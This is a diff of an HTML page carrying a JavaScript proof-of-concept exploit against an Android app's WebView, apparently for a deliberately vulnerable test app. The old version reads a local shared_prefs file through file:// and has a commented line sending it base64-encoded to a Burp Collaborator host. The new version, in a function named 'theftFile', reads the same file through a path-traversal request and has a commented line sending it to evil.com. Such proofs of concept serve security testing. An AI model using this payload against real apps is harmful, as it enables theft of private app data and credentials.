@@ -1,16 +1,27 @@
-<script>
-    var url = 'file:///data/data/DEVAA_VAR/shared_prefs/FakerActivity.xml'; //local file
-    function load(url) {
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                // fetch('https://||.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); 
-                //send b64 encoded file to attacker
-                window.load(url)
-            }
-        }
-        xhr.open('GET', url, true);
-        xhr.send('');
-    }
-    load(url)
+<!DOCTYPE html>
+<html>
+<head>
+   <title>DEVAA_VAR</title>
+</head>
+<body>
+<script type="text/javascript">
+   function theftFile(path, callback) {
+     var oReq = new XMLHttpRequest();
+
+     oReq.open("GET", "https://any.domain/local_cache/..%2F" + encodeURIComponent(path), true);
+     oReq.onload = function(e) {
+       callback(oReq.responseText);
+     }
+     oReq.onerror = function(e) {
+       callback(oReq.status);
+     }
+     oReq.send();
+   }
+
+   theftFile("shared_prefs/FakerActivity.xml", function(contents) {
+       location.href = contents;
+      //  location.href = "https://evil.com/?data=" + encodeURIComponent(contents);
+   });
 </script>
+</body>
+</html>
